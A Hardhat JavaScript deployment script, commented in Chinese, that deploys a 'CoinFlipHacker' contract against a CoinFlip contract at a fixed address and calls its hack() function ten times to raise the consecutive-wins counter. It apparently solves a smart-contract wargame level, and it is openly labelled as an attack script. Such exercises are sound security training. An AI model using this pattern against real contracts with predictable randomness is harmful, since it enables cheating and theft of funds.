const { ethers } = require("hardhat");

// CoinFlip合约地址
const CoinFlipAddress = "0xfBe32ca17026224396eE7f16fcf27336B6E482F3";

// 部署CoinFlipHacker合约
async function DeployCoinFlipHacker() {
    const CoinFlipHacker = await ethers.getContractFactory("CoinFlipHacker"); // 获取Counter合约工厂
    const coinFlipHacker = await CoinFlipHacker.deploy(CoinFlipAddress); // 部署Counter合约
    await coinFlipHacker.waitForDeployment(); // 等待部署完成

    console.log("CoinFlipHacker deployed to:", await coinFlipHacker.getAddress()); // 打印合约地址
    return await coinFlipHacker.getAddress();
}

// 攻击脚本
async function CoinFlipHackerScript() {
    const [hacker] = await ethers.getSigners();

    const CoinFlipHackerAddress = await DeployCoinFlipHacker();

    // 加载CoinFlipHacker合约
    const coinFlipHacker = await ethers.getContractAt("CoinFlipHacker", CoinFlipHackerAddress);

    // 加载CoinFlip合约
    const coinFlip = await ethers.getContractAt("CoinFlip", CoinFlipAddress);

    console.log("攻击前 consecutiveWins = ", await coinFlip.consecutiveWins())

    let tx;
    for (let i = 0; i < 10; i++) {
        tx = await coinFlipHacker.connect(hacker).hack();
        await tx.wait();
        console.log("当前执行进度：", i);
    }

    console.log("攻击后 consecutiveWins = ", await coinFlip.consecutiveWins())
}

CoinFlipHackerScript().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});